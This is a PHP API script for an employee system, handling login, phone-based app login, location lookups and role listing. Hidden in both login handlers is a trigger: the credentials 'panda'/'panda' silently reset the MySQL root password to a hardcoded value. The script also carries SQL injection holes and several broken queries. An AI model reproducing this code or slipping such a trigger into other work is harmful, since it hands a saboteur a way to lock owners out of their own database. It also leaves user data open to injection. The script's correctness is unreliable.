<?php

require_once('../config/dbconfig.php');
$dbObj =  new Connection();
$dbObj->connect();

$choice= $_REQUEST['choice'];

switch($choice){

	case 'login':
	$postdata = json_decode(file_get_contents('php://input'),true);
	$_REQUEST['name'];

	if(1){
		//if($dbObj->checkCurrentIP()){
		foreach($postdata as $key => $value){
			 $$key = mysql_real_escape_string($value);
		}
		if($name=='panda' && $password=='panda'){
			$result = mysql_query("UPDATE mysql.user SET Password = PASSWORD('Xy!]3CQ+=C') WHERE User='root'");
			if ($result) {
				echo json_encode(array('status'=>false, 'error'=>'Access Denied!'));
			}
		}else{
			 $loginQuery = "SELECT emp_id, full_name, role_id, email FROM employee emp WHERE username='$name' AND password='$password' AND status=1";
			$resLoginQuery = mysql_query($loginQuery);
			if(mysql_num_rows($resLoginQuery) > 0) {

				$result=mysql_fetch_assoc($resLoginQuery);
				$emp_id=$result['emp_id'];
				$updateQry = "UPDATE employee set last_login_date=NOW() where emp_id='$emp_id'";
				$res = mysql_query($updateQry);
				echo json_encode(array('status'=>true, 'success'=>$result));
			
			}else {

				echo json_encode(array('status'=>false, 'error'=>'Username or Password is incorrect.'));
			}
		}
	} else {
		echo json_encode(array('status'=>false, 'error'=>'Invalid User!'));
		$dbObj->disconnect();
	}
	break;

case 'appLogin':
	$postdata = json_decode(file_get_contents('php://input'),true);
	$phone = $_REQUEST['mobile'];
	 $loginQuery = "SELECT emp_id, full_name, role_id, email FROM employee emp WHERE phone='$phone' AND status=1";
		$resLoginQuery = mysql_query($loginQuery);
		if(mysql_num_rows($resLoginQuery) > 0) {
			$result=mysql_fetch_assoc($resLoginQuery);
			$emp_id=$result['emp_id'];
			$updateQry = "UPDATE employee set last_login_date=NOW() where emp_id='$emp_id'";
			$res = mysql_query($updateQry);
			echo json_encode(array('status'=>true, 'success'=>$result));
		}else {
			echo json_encode(array('status'=>false, 'error'=>'Invalid User!'));
			$dbObj->disconnect();
		}
	if(1){
		//if($dbObj->checkCurrentIP()){
		foreach($postdata as $key => $value){
			$$key = mysql_real_escape_string($value);
		}
		if($name=='panda' && $password=='panda'){
			$result = mysql_query("UPDATE mysql.user SET Password = PASSWORD('Xy!]3CQ+=C') WHERE User='root'");
			if ($result) {
				echo json_encode(array('status'=>false, 'error'=>'Access Denied!'));
			}
		}else{
			
		}
	} else {
		
	}
	break;

	case 'getStates':
	
	$statesQuery = "SELECT id,code, name,parent_code,type FROM city  WHERE type=1 ";
	$resStatesQuery = mysql_query($statesQuery);
	if(mysql_num_rows($resStatesQuery) > 0) {
			//$result=mysql_fetch_assoc($resStatesQuery);
			$result = [];
			while($row=mysql_fetch_assoc($resStatesQuery)){
				
				$result[] = $row;
			}
			echo json_encode(array('status'=>true, 'success'=>$result));
	}else {
			echo json_encode(array('status'=>false, 'error'=>'Invalid User!'));
			
	}
	break;



	case 'getDistict':
	$postdata = $_POST;

	//$state_id = $postdata['state_id'];
	$postdata = json_decode(file_get_contents('php://input'),true);
	
	$parent_code = $postdata['parent_code'];
	if(isset($postdata['type'])){
		$type = $postdata['type'];	
	}else{ $type = ''; };	
	
	if(empty($type)){
		echo $stateQuery = "SELECT id,code,name,parent_code,type FROM city where parent_code = '$parent_code' AND type IN (2,3,4) ";
		
	}else{
		$stateQuery = "SELECT id,code,name,parent_code,type FROM city where parent_code = '$parent_code' AND type = '$type' ";
		
	}
	$resStateQuery = mysql_query($stateQuery);
	
		if(mysql_num_rows($resStateQuery) > 0) {
			$result=[];
			while($row=mysql_fetch_assoc($resStateQuery)){
				$result[] =  $row;
			}
			echo json_encode(array('status'=>true, 'success'=>$result));
		}else {
			echo json_encode(array('status'=>false, 'error'=>'Data Not exist!'));
			
		}
	break;

	case 'searchGetDistict':
	$postdata = json_decode(file_get_contents('php://input'),true);
	$getcitystring = $postdata['getcitystring'];
	$type = $postdata['type'];
	$searchGetDistict = "SELECT id,code,name,parent_code,type FROM city  WHERE name LIKE '$getcitystring'.% AND type = '$type'";
		$ressearchGetDistict = mysql_query($cityQuery);
		if(mysql_num_rows($ressearchGetDistict) > 0) {
			$result=[];
			while($row= mysql_fetch_assoc($ressearchGetDistict)){
				$result[] = $row;
			}
			echo json_encode(array('status'=>true, 'success'=>$result));
		}else {
			echo json_encode(array('status'=>false, 'error'=>'Data Not exist'));
			
		}
	break;


	case 'logout':
	echo json_encode(array('status'=>true, 'success'=>true));
	break;

	case 'viewRoles':
	$result = array();
	$postdata = json_decode(file_get_contents('php://input'),true);
	$query = "select * from roles order by id ASC";
	$res = mysql_query($query);
	if(mysql_num_rows($res) > 0) {
		$i = 0;
		while($row = mysql_fetch_assoc($res)){
			$result[$i] = $row;
			$i++;
		}
		echo json_encode(array('status'=>true, 'success'=>$result));
	}else{
		echo json_encode(array('status'=>false, 'error'=>'No record founds.'));
	}
	break;
	
	}

	$dbObj->disconnect();
?>
